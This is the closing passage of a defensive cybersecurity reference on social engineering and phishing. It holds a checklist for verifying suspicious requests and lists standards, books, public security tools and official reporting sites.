ALWAYS VERIFY BEFORE ACTING
✓ Call back on a number you look up independently
✓ Walk to the person's desk if in the same building
✓ Use a different communication channel to confirm
✓ Report suspicious interactions to the security team
```

---

## References and Further Reading

### Standards and Frameworks
- NIST SP 800-50: Building an Information Technology Security Awareness and Training Program
- NIST SP 800-177: Trustworthy Email
- MITRE ATT&CK Framework: https://attack.mitre.org
- MITRE CAPEC (Common Attack Pattern Enumeration and Classification): https://capec.mitre.org
- FIDO Alliance FIDO2 Specifications: https://fidoalliance.org/fido2/

### Books
- *The Art of Deception* — Kevin D. Mitnick and William L. Simon
- *Social Engineering: The Science of Human Hacking* — Christopher Hadnagy
- *Influence: The Psychology of Persuasion* — Robert B. Cialdini
- *The Art of Intrusion* — Kevin D. Mitnick

### Tools Reference
- GoPhish: https://github.com/gophish/gophish
- Evilginx2: https://github.com/kgretzky/evilginx2
- SET (Social Engineering Toolkit): https://github.com/trustedsec/social-engineer-toolkit
- PhishTank: https://phishtank.org (community phishing URL database)
- crt.sh: https://crt.sh (Certificate Transparency search)
- MXToolbox: https://mxtoolbox.com (email DNS diagnostics)
- VirusTotal: https://virustotal.com (URL/file analysis)

### Reporting Resources
- FBI IC3: https://ic3.gov
- CISA Report Phishing: https://www.cisa.gov/report
- Anti-Phishing Working Group (APWG): https://apwg.org

---

*This document is part of the TeamStarWolf Cybersecurity Reference Library. For contributions or corrections, open a pull request. All techniques are presented for defensive and educational purposes only.*
